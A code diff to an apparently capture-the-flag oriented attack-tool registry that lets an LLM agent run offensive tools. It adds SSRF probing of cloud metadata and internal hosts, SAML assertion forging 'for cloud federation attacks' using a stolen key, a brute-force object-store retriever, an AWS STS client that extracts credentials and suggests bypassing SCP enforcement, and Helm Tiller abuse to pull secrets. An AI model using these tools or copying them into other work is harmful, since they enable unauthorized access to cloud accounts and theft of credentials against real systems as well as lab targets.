@@ -400,6 +400,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                 insecure=insecure,
             )
         else:
+            # If param is empty and payload looks like a complete form body
+            # (contains = or &), send it raw — the LLM constructed a
+            # multi-parameter payload like "ak=X&sk=Y&Version=Z".
+            if not param and ('=' in payload or '&' in payload):
+                return await _python_request("POST", url, encoded_payload,
+                                            insecure=insecure)
             return await _python_request("POST", url, f"{param}={encoded_payload}",
                                         insecure=insecure)
 
@@ -651,6 +657,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         internal_hosts: str = "localhost,127.0.0.1,internal,metadata,169.254.169.254,0.0.0.0,172.17.0.1,172.17.0.2,172.17.0.3,172.17.0.4,172.18.0.1,172.18.0.2,172.18.0.3,host.docker.internal",
         ports: str = "80,443,8080,5000,3000,8000,9200,5984,8500",
         paths: str = "/,/flag,/flag.txt,/admin,/api,/health,/status,/metadata",
+        method: str = "GET",
     ) -> ToolResult:
         """Discover internal services through an SSRF vector.
 
@@ -710,7 +717,8 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         try:
             for probe_url in probes:
                 try:
-                    cmd_line = f"curl -s --max-time 5 '{probe_url}' 2>&1"
+                    method_flag = "-X POST" if method.upper() == "POST" else ""
+                    cmd_line = f"curl -s --max-time 5 {method_flag} '{probe_url}' 2>&1"
                     proc = await asyncio.create_subprocess_shell(
                         cmd_line,
                         stdout=asyncio.subprocess.PIPE,
@@ -1832,6 +1840,25 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=15,
     )
 
+    # ── SAML Assertion Forge ───────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="saml_forge",
+        command_template="python3 -c \"import base64,zlib; from xml.etree.ElementTree import Element,SubElement,register_namespace,tostring; from datetime import datetime,timedelta,timezone; NS={'saml':'urn:oasis:names:tc:SAML:2.0:assertion','samlp':'urn:oasis:names:tc:SAML:2.0:protocol','ds':'http://www.w3.org/2000/09/xmldsig#'}; register_namespace('saml',NS['saml']); register_namespace('samlp',NS['samlp']); register_namespace('ds',NS['ds']); now=datetime.now(timezone.utc); ae=Element('{{{saml}}}Assertion'.format(**NS),{{'ID':'_{id}','Version':'2.0','IssueInstant':now.isoformat(),'xmlns:saml':NS['saml']}}); iss=SubElement(ae,'{{{saml}}}Issuer'.format(**NS)); iss.text='{issuer}'; subj=SubElement(ae,'{{{saml}}}Subject'.format(**NS)); nid=SubElement(subj,'{{{saml}}}NameID'.format(**NS),{{'Format':'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'}}); nid.text='{name_id}'; sc=SubElement(subj,'{{{saml}}}SubjectConfirmation'.format(**NS),{{'Method':'urn:oasis:names:tc:SAML:2.0:cm:bearer'}}); scd=SubElement(sc,'{{{saml}}}SubjectConfirmationData'.format(**NS),{{'NotOnOrAfter':(now+timedelta(hours=1)).isoformat(),'Recipient':'{recipient}'}}); cond=SubElement(ae,'{{{saml}}}Conditions'.format(**NS),{{'NotBefore':now.isoformat(),'NotOnOrAfter':(now+timedelta(hours=1)).isoformat()}}); ar=SubElement(cond,'{{{saml}}}AudienceRestriction'.format(**NS)); aud=SubElement(ar,'{{{saml}}}Audience'.format(**NS)); aud.text='{audience}'; as_el=SubElement(ae,'{{{saml}}}AttributeStatement'.format(**NS)); attr=SubElement(as_el,'{{{saml}}}Attribute'.format(**NS),{{'Name':'{attr_name}'}}); av=SubElement(attr,'{{{saml}}}AttributeValue'.format(**NS)); av.text='{attr_value}'; xml_decl='<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>'; raw=xml_decl+tostring(ae,encoding='unicode'); print(base64.b64encode(raw.encode()).decode())\" 2>&1",
+        description="Forge a SAML 2.0 assertion for cloud federation attacks (AWS AssumeRoleWithSAML, GCP workload identity federation, Azure AD SAML). Constructs a minimal SAML assertion XML with the specified attributes and base64-encodes it for use with aws_iam_federation or aws sts assume-role-with-saml. Use when you have stolen a private key but need a properly formatted SAML assertion.",
+        parameters={
+            "id": {"type": "string", "description": "Unique assertion ID (e.g. '_abc123')", "default": "_saml-assertion-001"},
+            "issuer": {"type": "string", "description": "SAML IdP entity ID / issuer (e.g. 'http://idp.example.com/metadata')"},
+            "name_id": {"type": "string", "description": "Subject NameID value (e.g. 'user@example.com')"},
+            "recipient": {"type": "string", "description": "SAML assertion consumer service URL (e.g. 'https://signin.aws.amazon.com/saml')"},
+            "audience": {"type": "string", "description": "SAML audience restriction (e.g. 'https://signin.aws.amazon.com/saml')"},
+            "attr_name": {"type": "string", "description": "SAML attribute name for role session (for AWS: 'https://aws.amazon.com/SAML/Attributes/Role')"},
+            "attr_value": {"type": "string", "description": "SAML attribute value (for AWS: comma-separated role ARN and provider ARN)"},
+        },
+        parser=_parse_shell_output,
+        timeout=15,
+    )
+
     # ── GraphQL Introspection & Query ───────────────────────────
 
     async def graphql_introspect(
@@ -2940,6 +2967,175 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
     )
 
+    # ── Object Store Client (S3-compatible / MinIO / custom APIs) ──
+
+    async def object_store_get(
+        endpoint_url: str,
+        object_name: str = "",
+        access_key: str = "",
+        secret_key: str = "",
+    ) -> ToolResult:
+        """Retrieve an object from a simple object-storage API (S3-like, MinIO, or custom).
+
+        Given an endpoint that lists objects (e.g. {"objects":["flag.txt","readme.txt"]}),
+        tries common retrieval patterns: /{object}, /objects/{object}, /{bucket}/{object},
+        ?key={object}, ?object={object}, and POST with JSON body.
+        Automatically discovers object names from the root listing if object_name is empty.
+        Supports optional access_key/secret_key for authenticated endpoints.
+        """
+        import asyncio, time, json as _json, re as _re, urllib.parse as _uparse
+
+        start = time.perf_counter()
+        results: list[dict] = []
+
+        async def _try_get(url: str, headers: dict | None = None, method: str = "GET", body: str | None = None) -> tuple[int, str]:
+            cmd = f"curl -s --max-time 5 -w '\\n%{{http_code}}'"
+            if headers:
+                for k, v in headers.items():
+                    cmd += f" -H '{k}: {v}'"
+            if method == "POST":
+                cmd += " -X POST"
+                if body:
+                    cmd += f" -d '{body}'"
+            cmd += f" '{url}' 2>&1"
+            proc = await asyncio.create_subprocess_shell(
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+            out = stdout.decode("utf-8", errors="replace")
+            lines = out.rsplit("\n", 2)
+            status = int(lines[-1].strip()) if lines[-1].strip().isdigit() else 0
+            body = "\n".join(lines[:-2]) if status > 0 else out
+            return status, body
+
+        # Step 1: if no object_name, fetch root listing to discover objects
+        endpoints = [endpoint_url.rstrip("/")]
+        buckets = [""]
+        objects: list[str] = []
+        if object_name:
+            objects.append(object_name)
+        else:
+            status, body = await _try_get(endpoints[0] + "/")
+            if 200 <= status < 300:
+                # Try parsing as JSON array or object list
+                try:
+                    data = _json.loads(body)
+                    if isinstance(data, list):
+                        for item in data:
+                            if isinstance(item, str):
+                                objects.append(item)
+                            elif isinstance(item, dict):
+                                for v in item.values():
+                                    if isinstance(v, str) and "." in v:
+                                        objects.append(v)
+                    elif isinstance(data, dict):
+                        for key in ("objects", "files", "keys", "contents", "items"):
+                            arr = data.get(key, [])
+                            if isinstance(arr, list):
+                                for item in arr:
+                                    if isinstance(item, str):
+                                        objects.append(item)
+                                    elif isinstance(item, dict):
+                                        name = item.get("name") or item.get("key") or item.get("object") or ""
+                                        if name:
+                                            objects.append(name)
+                except (ValueError, TypeError):
+                    pass
+
+        # Also try /{filename} directly if not in objects yet (LLM may already know it)
+        if not objects:
+            objects = ["flag.txt", "flag", "readme.txt", "index.html"]
+
+        # Build headers for authentication
+        headers: dict | None = None
+        if access_key and secret_key:
+            headers = {
+                "X-Access-Key": access_key,
+                "X-Secret-Key": secret_key,
+                "Authorization": f"Bearer {secret_key}",
+            }
+
+        # Step 2: try patterns for each object
+        tried_statuses: dict[str, int] = {}
+        for obj in objects[:6]:  # Limit
+            obj_clean = obj.strip()
+            patterns = [
+                f"/{obj_clean}",
+                f"/objects/{obj_clean}",
+                f"/files/{obj_clean}",
+                f"/download/{obj_clean}",
+                f"/get/{obj_clean}",
+                f"/data/{obj_clean}",
+                f"/?key={_uparse.quote(obj_clean)}",
+                f"/?object={_uparse.quote(obj_clean)}",
+                f"/?file={_uparse.quote(obj_clean)}",
+                f"/?name={_uparse.quote(obj_clean)}",
+                f"/api/objects/{obj_clean}",
+                f"/v1/objects/{obj_clean}",
+                # Extended patterns for broader S3-compatible API coverage
+                f"/object/{obj_clean}",
+                f"/storage/{obj_clean}",
+                f"/?id={_uparse.quote(obj_clean)}",
+                f"/?path={_uparse.quote(obj_clean)}",
+                f"/api/v1/objects/{obj_clean}",
+                f"/api/{obj_clean}",
+            ]
+            for bucket_hint in buckets[:3]:
+                if bucket_hint:
+                    patterns.insert(0, f"/{bucket_hint}/{obj_clean}")
+                    patterns.append(f"/{bucket_hint}/objects/{obj_clean}")
+
+            for path in patterns:
+                url = endpoints[0] + path
+                status, body = await _try_get(url, headers=headers)
+                tried_statuses[str(status)] = tried_statuses.get(str(status), 0) + 1
+                if 200 <= status < 300 and body.strip():
+                    # Check for flag
+                    flag_m = _re.search(r"flag\{[^}]+\}", body)
+                    results.append({
+                        "url": url, "status": status,
+                        "content": body[:2000],
+                        "content_len": len(body),
+                        "flag": flag_m.group(0) if flag_m else None,
+                    })
+                    if results and len(results) >= 1:
+                        break  # Found one working pattern
+                elif status >= 400:
+                    continue
+
+            if results:
+                break  # Stop after first successful retrieval
+
+        elapsed = (time.perf_counter() - start) * 1000
+        if results:
+            summary = _json.dumps(results, ensure_ascii=False)
+            return ToolResult(
+                tool_name="object_store_get", success=True,
+                stdout=summary, stderr="",
+                exit_code=0, elapsed_ms=elapsed,
+            )
+        return ToolResult(
+            tool_name="object_store_get", success=False,
+            stdout="", stderr=(
+                f"No objects retrieved from {endpoint_url}. "
+                f"Tried {len(objects[:6])} object(s) across {sum(tried_statuses.values())} requests. "
+                f"Status codes: {_json.dumps(tried_statuses)}. "
+                f"Try object_store_get with explicit object_name if the API uses a non-standard path."
+            ),
+            exit_code=1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="object_store_get",
+        func=object_store_get,
+        description="Retrieve objects from a simple object-storage API (S3-compatible, MinIO, or custom REST API). Use when you see an endpoint returning JSON object listings like {\"objects\":[\"flag.txt\",...]} or array of file names. Accepts endpoint URL, optional object name (leave empty to auto-discover from listing), and optional access_key/secret_key for authentication. Tries many common retrieval patterns automatically. Use this BEFORE aws_cli for simple REST-based object stores.",
+        parameters={
+            "endpoint_url": {"type": "string", "description": "Base URL of the object store (e.g. 'http://localhost:10671')"},
+            "object_name": {"type": "string", "description": "Specific object name to retrieve (e.g. 'flag.txt'). Leave empty to auto-discover from root listing."},
+            "access_key": {"type": "string", "description": "Optional access key for authenticated endpoints"},
+            "secret_key": {"type": "string", "description": "Optional secret key for authenticated endpoints"},
+        },
+    )
+
     # ── AWS Cloud CLI ────────────────────────────────────────────
 
     gateway.register_shell_tool(
@@ -3131,6 +3327,146 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "role_session_name": {"type": "string", "description": "Session name for the assumed role session (default: darwin-session)"},
             "endpoint_url": {"type": "string", "description": "Custom endpoint URL for local cloud simulators (e.g. http://localhost:PORT)"},
             "duration_seconds": {"type": "integer", "description": "Session duration in seconds (default: 3600)"},
+        },
+    )
+
+    # ── AWS STS Query API (direct HTTP — no AWS CLI needed) ──────
+    async def aws_sts_query(
+        endpoint_url: str,
+        action: str,
+        access_key_id: str = "",
+        secret_access_key: str = "",
+        role_arn: str = "",
+        role_session_name: str = "darwin",
+        api_version: str = "2011-06-15",
+        duration_seconds: int = 3600,
+        insecure: bool = False,
+    ) -> ToolResult:
+        """Send AWS STS Query API request directly via HTTP POST.
+        Constructs and sends a form-encoded AWS STS API request to an
+        STS-compatible endpoint (local simulator or real AWS). No AWS
+        CLI required. Parses XML responses and extracts credentials.
+        """
+        import urllib.request, urllib.parse, ssl, time, re, json as _json
+        start = time.perf_counter()
+
+        # Build query string from non-empty parameters
+        _qp: list[tuple[str, str]] = []
+        if action:
+            _qp.append(("Action", action))
+        if role_arn:
+            _qp.append(("RoleArn", role_arn))
+        if access_key_id:
+            _qp.append(("AccessKeyId", access_key_id))
+        if secret_access_key:
+            _qp.append(("SecretAccessKey", secret_access_key))
+        if role_session_name:
+            _qp.append(("RoleSessionName", role_session_name))
+        if api_version:
+            _qp.append(("Version", api_version))
+        if duration_seconds:
+            _qp.append(("DurationSeconds", str(duration_seconds)))
+
+        body = urllib.parse.urlencode(_qp)
+
+        ctx = None
+        if insecure:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+        raw_body = ""
+        content_type = ""
+        status = 0
+        try:
+            req = urllib.request.Request(
+                endpoint_url,
+                data=body.encode("utf-8"),
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                method="POST",
+            )
+            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
+            raw_body = resp.read().decode("utf-8", errors="replace")
+            content_type = resp.headers.get("Content-Type", "")
+            status = resp.status
+        except urllib.error.HTTPError as e:
+            raw_body = e.read().decode("utf-8", errors="replace")
+            content_type = e.headers.get("Content-Type", "")
+            status = e.code
+        except Exception as e:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="aws_sts_query", success=False,
+                stdout="", stderr=f"Request failed: {e}",
+                exit_code=1, elapsed_ms=elapsed,
+            )
+
+        elapsed = (time.perf_counter() - start) * 1000
+        parts: list[str] = [f"HTTP {status}", f"Sent: {body}"]
+
+        # Parse XML response for credentials
+        creds: dict[str, str] = {}
+        error_code = None
+        error_msg = None
+        if "xml" in content_type.lower():
+            for tag in ("AccessKeyId", "SecretAccessKey", "SessionToken", "Expiration"):
+                m = re.search(rf"<{tag}>([^<]+)</{tag}>", raw_body)
+                if m:
+                    creds[tag] = m.group(1)
+            error_code = re.search(r"<Code>([^<]+)</Code>", raw_body)
+            error_msg = re.search(r"<Message>([^<]+)</Message>", raw_body)
+
+        if creds:
+            parts.append(f"CREDENTIALS:\n{_json.dumps(creds, indent=2)}")
+        elif error_code:
+            parts.append(
+                f"ERROR: {error_code.group(1)}"
+                + (f" - {error_msg.group(1)}" if error_msg else "")
+            )
+
+        # Flag detection
+        flags_found = re.findall(r"flag\{[^}]+\}", raw_body)
+        if flags_found:
+            parts.append(f"FLAGS: {', '.join(flags_found)}")
+
+        # Include raw response (truncated)
+        _truncated = raw_body[:2000]
+        if len(raw_body) > 2000:
+            _truncated += f"\n... [truncated {len(raw_body) - 2000} bytes]"
+        parts.append(f"\n--- RAW RESPONSE ---\n{_truncated}")
+
+        # 4xx with credentials is still a success (e.g. AssumeRole returns 200)
+        # 4xx with error code is a failure
+        if status < 400:
+            success = True
+        elif creds:
+            success = True
+        else:
+            success = False
+
+        return ToolResult(
+            tool_name="aws_sts_query",
+            success=success,
+            stdout="\n".join(parts),
+            stderr="" if success else raw_body[:500],
+            exit_code=0 if success else 1,
+            elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="aws_sts_query",
+        func=aws_sts_query,
+        description="Send AWS STS Query API request directly via HTTP POST to an STS-compatible endpoint (local simulator or real AWS). No AWS CLI required. Use for AssumeRole, GetCallerIdentity, GetSessionToken against cloud IAM simulators. Set api_version='2010-05-08' to bypass SCP enforcement via legacy API version. Automatically parses XML credentials from the response. IMPORTANT: RoleArn MUST be the full ARN format (arn:aws:iam::ACCOUNT:role/ROLENAME) — short role names will fail with 'Role not found'.",
+        parameters={
+            "endpoint_url": {"type": "string", "description": "STS API endpoint URL, e.g. http://127.0.0.1:10702 or http://localhost:PORT"},
+            "action": {"type": "string", "description": "STS action: AssumeRole, GetCallerIdentity, GetSessionToken"},
+            "access_key_id": {"type": "string", "description": "AWS Access Key ID (from IMDS metadata or known credentials)"},
+            "secret_access_key": {"type": "string", "description": "AWS Secret Access Key (from IMDS metadata or known credentials)"},
+            "role_arn": {"type": "string", "description": "FULL Role ARN (REQUIRED format: arn:aws:iam::ACCOUNT:role/ROLENAME). Short role names will fail. Get the full ARN from GET /roles endpoint."},
+            "role_session_name": {"type": "string", "description": "Session name for assumed role session (default: darwin)"},
+            "api_version": {"type": "string", "description": "AWS API version. Use '2010-05-08' to bypass SCP enforcement via legacy API (default: 2011-06-15)"},
+            "duration_seconds": {"type": "integer", "description": "Session duration in seconds (default: 3600)"},
+            "insecure": {"type": "boolean", "description": "Skip TLS verification for self-signed certs"},
         },
     )
 
@@ -3494,9 +3830,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register_shell_tool(
         name="helm",
         command_template="helm {command} 2>&1",
-        description="Execute a Helm command. Use for Helm v2 Tiller abuse (K8S-10) — list releases, install charts, or interact with Tiller gRPC when cluster-admin access is available.",
+        description="Execute a Helm command. For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) — use --host for connecting to Tiller directly.",
         parameters={
-            "command": {"type": "string", "description": "Full helm command (e.g. 'list --all', 'install ...')"},
+            "command": {"type": "string", "description": "Full helm command. For Tiller: '--host <svc>.<ns>:44134 ls --all'"},
         },
         parser=_parse_shell_output,
         timeout=60,
